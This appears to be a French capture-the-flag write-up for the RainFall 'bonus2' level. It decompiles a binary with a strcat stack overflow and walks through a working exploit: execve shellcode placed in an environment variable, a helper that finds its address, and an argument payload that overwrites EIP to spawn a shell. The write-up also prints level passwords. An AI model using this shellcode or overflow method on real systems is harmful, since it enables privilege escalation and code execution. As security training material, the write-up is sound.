# Bonus2:

pass : `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`

## Sources :
```c=
#include <string.h>
#include <stdlib.h>

int language = 0;

int		greetuser(char *name) {
	char str[72];  // ebp-0x48 == esp+0x10
	switch (language) {
		case 0:
			strcpy(str, "Hello ");
			break;
		case 1:
			strcpy(str, "Hyvää päivää ");
			break;
		case 2:
			strcpy(str, "Goedemiddag! ");
			break;
		default:
			break;
	}
	strcat(str, name);
	return (puts(str));
}

int		main(int ac, char **av) {
	char str[76];  // esp+0x50
	char *lang;  // esp+0x9c

	if (ac != 3)
		return 1;

	memset(str, '\0', 19);  // 0x13

	stpncpy(str, av[1], 40);  // 0x28
	strncpy(str + 40, av[2], 32);  // x020
	lang = getenv("LANG");
	if (*lang) {
		if (!memcmp(lang, "fi", 2)) {
			language = 1;
		} else {
			if (!memcmp(lang, "nl",2)) {
				language = 2;
			}
		}
	}
	return greetuser(str);
}
```

## Recherche :

On remarque que si on a lang == "fi" ou "nl", alors dans `greetuser`, la première partie de `str` sera plus longue et on va segfault.

Faisons alors `export LANG="fi"`

Maintenant, on voit que l'`EIP` est réécrite à partir de 16 caractères sur le second argument.
On doit aussi bien mettre 40 caractères pour le premièr argument afin que le second soit écrit.

On va maintenant procéder comme pour le `bonus0` en mettant un shellcode dans une variable qu'on va export, puis en indiquant cette adresse lors de l'écrasement de l'`EIP`

On va fait mettre notre shell code dans un `env` `EXPLOIT` :
```
export EXPLOIT="`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"`
```
Dans `/tmp`, on va créer un programme pour récupérer l'addresse :
bonus2@RainFall:/tmp$ cat getenv.c
```c
#include <stdio.h>
#include <stdlib.h>

int     main(int ac, char **av) {
        printf("%s is %p\n", av[1], getenv(av[1]));
        return 0;
}
```

`gcc getenv.c -o bonus2`

```
bonus2@RainFall:/tmp$ ./bonus2 EXPLOIT
EXPLOIT is 0xbffff918
```

En retournant dans le `~`, on va pouvoir executer notre programme en appelant notre shellcode :
```sh
bonus2@RainFall:~$ ./bonus2 $(perl -e 'print "A"x40') $(perl -e 'print "B"x18 . "\x18\xf9\xff\xbf"')
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "fi"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "fi"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB▒���
$ whoami
bonus3
```

On est bon !

## Exploit :

```shell=
export LANG="fi"; export EXPLOIT="$(perl -e 'print "\x90"x50 . ""')

bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ export EXPLOIT="`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "fi"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
bonus2@RainFall:~$ cd /tmp/
bonus2@RainFall:/tmp$ ./bonus2 EXPLOIT
EXPLOIT is 0xbffff918
bonus2@RainFall:/tmp$ cd -
/home/user/bonus2
bonus2@RainFall:~$ ./bonus2 $(perl -e 'print "A"x40') $(perl -e 'print "B"x18 . "\x18\xf9\xff\xbf"')
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "fi"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "fi"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB▒���
$ whoami
bonus3
$ cd ../bonus3
$ cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
